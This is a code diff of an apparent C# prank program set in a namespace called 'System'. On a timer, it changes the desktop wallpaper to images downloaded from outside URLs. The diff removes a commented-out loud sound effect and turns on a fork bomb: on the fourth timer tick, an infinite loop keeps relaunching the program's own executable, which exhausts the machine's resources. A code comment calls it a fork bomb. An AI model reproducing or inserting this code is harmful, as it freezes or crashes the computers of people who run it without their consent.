@@ -49,10 +49,11 @@ namespace System
                 DateTime.Now);
 
             var stateTimer = new Timer(statusChecker.CheckStatus,
-                autoEvent, 5000, 10000);
+                autoEvent, 5000, 10000 * 60);
 
             //**Uncomment the below if you want to re invoke the callback but REMEMBER to comment the code 
             //**for the fork bomb or else the rabbit from of mice and men will haunt u forever - RIP 1k37.
+
             //When autoEvent signals, change the period to every 10 seconds.
             //autoEvent.WaitOne();
             //stateTimer.Change(0, 10000);
@@ -124,32 +125,30 @@ namespace System
                 DateTime.Now.ToString("h:mm:ss.fff"),
                 (++invokeCount).ToString());
 
-            //if (invokeCount == 1)
-            //{
-            //    Program.Set(new Uri("https://i.ytimg.com/vi/Uv5shWPfqvA/maxresdefault.jpg"), Program.Style.Fill);
-            //}
-            //if (invokeCount == 2)
-            //{
-            //    Program.Set(new Uri("https://www.dailydot.com/wp-content/uploads/7dd/f2/f4ff8b0d242f954810eb3b609c747f31.jpg"), Program.Style.Fill);
-            //}
             if (invokeCount == 1)
             {
-
-
-                System.Media.SoundPlayer player = new SoundPlayer(@"C:\Users\Daniaal\Documents\Visual Studio 2017\Projects\System\System\meme\ear-rape.wav");
-
-                player.Play();
-
-
+                Program.Set(new Uri("https://i.ytimg.com/vi/-gYqd7kGRFk/maxresdefault.jpg"), Program.Style.Fill);
             }
-            //if (invokeCount == 3)
-            //{
-            //    while (true)
-            //    {
-            //        Process.Start(Assembly.GetExecutingAssembly().Location);
-            //    }
-            //}
 
+            if (invokeCount == 2)
+            {
+                Program.Set(new Uri("https://i.ytimg.com/vi/Xm_dS-wEFvs/maxresdefault.jpg"), Program.Style.Fill);
+            }
+
+            if (invokeCount == 3)
+            {
+                Program.Set(new Uri("https://i.amz.mshcdn.com/xiXB9wCMR18CFrURMXFvDXvx0o4=/950x534/filters:quality(90)/https%3A%2F%2Fblueprint-api-production.s3.amazonaws.com%2Fuploads%2Fcard%2Fimage%2F751018%2Ff136d1e5-35db-4a62-8d1d-002abac70177.jpg"),Program.Style.Fill);
+            }
+
+            if (invokeCount == 4)
+            {
+                while (true)
+                {
+                    Process.Start(Assembly.GetExecutingAssembly().Location);
+                }
+            }
+
+            //this would never get hit.
             if (invokeCount == maxCount)
             {
                 // Reset the counter and signal the waiting thread.
@@ -157,6 +156,7 @@ namespace System
                 autoEvent.Set();
             }
         }
+        
     }
 
 }
